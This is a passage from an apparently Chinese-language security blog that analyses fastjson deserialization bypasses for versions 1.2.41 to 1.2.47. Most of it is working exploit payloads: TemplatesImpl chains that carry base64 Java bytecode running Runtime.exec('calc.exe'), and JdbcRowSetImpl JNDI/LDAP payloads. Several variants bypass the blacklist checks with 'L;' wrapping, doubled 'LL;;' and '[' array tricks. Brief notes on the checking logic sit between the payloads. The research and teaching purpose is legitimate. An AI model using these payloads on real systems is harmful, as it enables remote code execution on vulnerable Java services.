<span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_name&#x27;:&#x27;b1uel0n3&#x27;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_tfactory&#x27;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>注意需要开启autoType，而ParserConfig类提供了对应的setter方法：<br><img src="/archives/1970b414/image-20250925200213570.png" alt="image-20250925200213570"></p><p>ParserConfig类提供了getGlobalInstance()静态方法供实例化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><blockquote><p>注意这个是全局配置，不能调用构造方法是因为它是局部配置</p></blockquote><p>JdbcRowSetImpl链POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:5432/b1uel0n3\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>然后是数组类型的绕过，主要解析逻辑位于DefaultJSONParser#parseArray方法，json需要满足一定格式，通过报错信息一步一步修改即可</p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;[&#123;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_name&#x27;:&#x27;b1uel0n3&#x27;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_tfactory&#x27;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/archives/1970b414/image-20250925202645275.png" alt="image-20250925202645275"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl;\&quot;[&#123;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:5432/b1uel0n3\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson 1.2.42"></a>fastjson 1.2.42</h1><p>依旧采用黑白名单，但黑白名单转变成了HashCode的形式</p><p><img src="/archives/1970b414/image-20250925203422905.png" alt="image-20250925203422905"></p><p><img src="/archives/1970b414/image-20250925203814462.png" alt="image-20250925203814462"></p><p>检测逻辑也成了检测类名的哈希值</p><p><img src="/archives/1970b414/image-20250925204019512.png" alt="image-20250925204019512"></p><p>且跟进checkAutoType方法，发现他会对我们@type值的第一位和最后一位进行检测进行哈希运算，如果被包装过就会去掉首尾字符，这里只能检测添加了特殊符号如逗号等或者进行了编码的类名，<strong>检测不了我们前面的数组绕过</strong>，<strong>只能检测<code>L</code>开头<code>;</code>结尾的poc</strong></p><p>最后在TypeUtils.loadClass进行类加载的逻辑就和之前是一样的了</p><p><img src="/archives/1970b414/image-20250925204406767.png" alt="image-20250925204406767"></p><p>细心点我们就能发现他虽然能检测到，但只能去除首尾，那我们就可以利用双写来绕过</p><p>POC：</p><p>TemplatesImpl链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_name&#x27;:&#x27;b1uel0n3&#x27;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_tfactory&#x27;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>JdbcRowSetImpl链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:5432/b1uel0n3\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>数组绕过还是之前的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;[&#123;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_name&#x27;:&#x27;b1uel0n3&#x27;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_tfactory&#x27;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl;\&quot;[&#123;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:5432/b1uel0n3\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson 1.2.43"></a>fastjson 1.2.43</h1><p><img src="/archives/1970b414/image-20250925205736337.png" alt="image-20250925205736337"></p><p>直接检测前两位如果为<code>LL</code>直接抛出错误，但依旧能进行数组绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;[&#123;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=\&quot;],&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_name&#x27;:&#x27;b1uel0n3&#x27;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#x27;_tfactory&#x27;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\&quot;&#125;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl;\&quot;[&#123;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:5432/b1uel0n3\&quot;, &quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="fastjson-1-2-44-46"><a href="#fastjson-1-2-44-46" class="headerlink" title="fastjson 1.2.44-46"></a>fastjson 1.2.44-46</h1><p>修复了<code>[</code>的绕过</p><p><img src="/archives/1970b414/image-20250925210631198.png" alt="image-20250925210631198"></p><p><code>[</code>开头直接抛出异常，<code>L</code>开头<code>;</code>结尾也抛出异常，只能尝试寻找黑名单以外的类进行利用</p><h1 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson 1.2.47"></a>fastjson 1.2.47</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>漏洞描述：可以在<strong>不开启autoType</strong>的情况下触发反序列化</p><p>影响版本：</p><p>1.2.25 &lt;&#x3D; fastjson &lt;&#x3D;1.2.47</p><p>利用条件：</p><ul><li>小于 1.2.48 版本的通杀，<code>AutoType</code>为关闭状态也可以。</li><li>loadClass中默认cache设置为<code>true</code></li></ul><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在checkAutoType方法中，前面我们都是通过TypeUtils.loadClass方法返回clazz进行实例化某个类使用：</p><p><img src="/archives/1970b414/image-20250927133217966.png" alt="image-20250927133217966"></p><p>但除此之外还有其他方式返回clazz：<br><img src="/archives/1970b414/image-20250927133309406.png" alt="image-20250927133309406"></p><p>由于autoTypeSupport默认为false，expectClass默认为null，那么fastjson就会依次通过TypeUtils.getClassFromMapping和deserializers.findClass来查找类，查找失败再进行黑白名单验证，然后再通过TypeUtils.loadClass加载没有找到的类。</p><p><img src="/archives/1970b414/image-20250927133720480.png" alt="image-20250927133720480"></p><p>这里简单跟进TypeUtils.getClassFromMapping和deserializers.findClass方法：</p><p><img src="/archives/1970b414/image-20250927133807148.png" alt="image-20250927133807148"></p><p>从mappings中获取对应的Class对象，mappings是一个ConcurrentHashMap对象，TypeUtils类静态代码块调用了addBaseClassMappings()方法：</p><p><img src="/archives/1970b414/image-20250927134108891.png" alt="image-20250927134108891"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 